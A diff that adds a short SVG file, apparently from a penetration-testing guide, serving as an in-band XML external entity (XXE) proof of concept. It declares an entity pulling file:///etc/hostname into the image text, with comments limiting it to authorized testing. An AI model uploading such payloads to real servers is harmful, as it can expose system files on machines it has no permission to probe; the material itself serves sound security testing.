@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- In-band XXE PoC (guide §14): if the server parses this SVG with external entities enabled,
+     the preview/thumbnail/error reflects the file contents. Authorized testing only;
+     read a non-sensitive marker or /etc/hostname for the PoC, not real secrets. Delete after. -->
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="60">
+  <text x="10" y="30" font-size="14">&xxe;</text>
+</svg>
